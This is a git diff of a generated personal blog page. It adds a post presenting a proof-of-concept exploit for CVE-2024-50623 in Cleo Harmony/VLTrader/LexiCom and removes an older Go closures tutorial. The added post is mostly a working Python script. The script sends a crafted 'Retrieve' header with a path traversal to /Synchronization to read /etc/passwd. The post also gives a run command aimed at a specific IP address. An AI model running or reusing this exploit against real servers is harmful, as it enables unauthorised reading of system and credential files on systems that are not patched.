@@ -158,6 +158,104 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/01/Cleo-Harmony_CVE-2024-50623/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/01/Cleo-Harmony_CVE-2024-50623/" class="post-title-link" itemprop="url">Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623) POC</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-04-01 14:53:15 / Modified: 15:47:39" itemprop="dateCreated datePublished" datetime="2025-04-01T14:53:15-04:00">2025-04-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/Cleo-Harmony/" itemprop="url" rel="index"><span itemprop="name">Cleo Harmony</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/Cleo-Harmony/CVE-2024-50623/" itemprop="url" rel="index"><span itemprop="name">CVE-2024-50623</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <pre><code>Description
+
+    Cleo has identified an unrestricted file upload and download vulnerability (CVE-2024-50623) that could lead to remote code execution.
+
+    The vulnerability affects the following products:
+
+    Cleo Harmony® (prior to version 5.8.0.21)
+    Cleo VLTrader® (prior to version 5.8.0.21)
+    Cleo LexiCom® (prior to version 5.8.0.21)
+    Cleo strongly advises all customers to immediately upgrade instances of Harmony, VLTrader, and LexiCom to the latest released patch (version 5.8.0.21) to address additional discovered potential attack vectors of the vulnerability. 
+
+    Please visit Unrestricted File Upload and Download Vulnerability Mitigation to take immediate action.
+
+Scope of impact
+
+Proof of Concept (Python Code)
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623)</span></span><br><span class="line"><span class="comment"># Date : 2025-04-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-50623</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3    </span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/Synchronization&#x27;</span></span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:xxxx</span></span><br><span class="line">host = args.host</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;z1GtnjQWsIKwGazlFX7V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;NX6iujIUcamW9umprA1vx19dzU6EZNLa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;kZ4jVQ4uZtITYtnweSsVDUEwZ2ltraTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Priority&#x27;</span>: <span class="string">&#x27;u=4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Retrieve&#x27;</span>: <span class="string">&#x27;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.get(f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>, cookies=cookies, headers=headers,<span class="built_in">timeout</span>=5)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&#x27;************************ &#123;len(response.text)&#125; ************************\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;HTTP 错误: &#123;http_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;连接错误: &#123;conn_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求超时: &#123;timeout_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求错误: &#123;req_err&#125;&quot;</span>)          </span><br></pre></td></tr></table></figure>
+
+The following code demonstrates how to execute the script:
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://122.51.176.242:8983</span><br></pre></td></tr></table></figure>
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/01/vuln-CVE-2024-45216/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1029,99 +1127,6 @@ The following code demonstrates how to execute the script:
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2018/11/28/goAnonymousFunctionClosure/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/11/28/goAnonymousFunctionClosure/" class="post-title-link" itemprop="url">Closure and Anonymous Function in Go</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-11-28 21:21:24" itemprop="dateCreated datePublished" datetime="2018-11-28T21:21:24-05:00">2018-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 11:38:03" itemprop="dateModified" datetime="2023-10-17T11:38:03-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/Closure-and-Anonymous-Function/" itemprop="url" rel="index"><span itemprop="name">Closure and Anonymous Function</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>In Go language, <strong><em>closures</em></strong> and <strong><em>anonymous functions</em></strong> are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts:</p>
-<ol>
-<li><strong><em>Closure</em></strong> Example:<br>A <strong><em>closure</em></strong> refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables.</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerVar := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Closure function</span></span><br><span class="line">    closure := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Outer variable outerVar:&quot;</span>, outerVar)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modify the outer variable</span></span><br><span class="line">    outerVar = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function again</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>In the above example, <strong><em>closure</em></strong> is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function.</p>
-<ol start="2">
-<li><strong><em>Anonymous Function</em></strong> Example:</li>
-</ol>
-<p>An <strong><em>anonymous function</em></strong> is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions.</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Define and call an anonymous function</span></span><br><span class="line">    result := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result of the anonymous function:&quot;</span>, result) <span class="comment">// Output: Result of the anonymous function: 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assign an anonymous function to a variable</span></span><br><span class="line">    add := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum := add(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Calling the anonymous function using a variable:&quot;</span>, sum) <span class="comment">// Output: Calling the anonymous function using a variable: 30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>In the above example, we define an <strong><em>anonymous function</em></strong> and call it directly. We also assign another <strong><em>anonymous function</em></strong> to the add variable and use that variable to call the function.</p>
-<p>To summarize the differences:</p>
-<p>A <strong><em>closure</em></strong> is a function that captures external variables and can access and modify them outside of the function.<br>An <strong><em>anonymous function</em></strong> is a function without a name, which can be assigned to a variable or passed as an argument to other functions.<br>It’s important to note that while <strong><em>closures</em></strong> often involve <strong><em>anonymous functions</em></strong>, not all <strong><em>anonymous functions</em></strong> are <strong><em>closures</em></strong>. A <strong><em>closure</em></strong> is a specific type of <strong><em>anonymous function</em></strong> that captures external variables.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1193,19 +1198,19 @@ The following code demonstrates how to execute the script:
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-count">63</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1233,7 +1238,7 @@ The following code demonstrates how to execute the script:
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
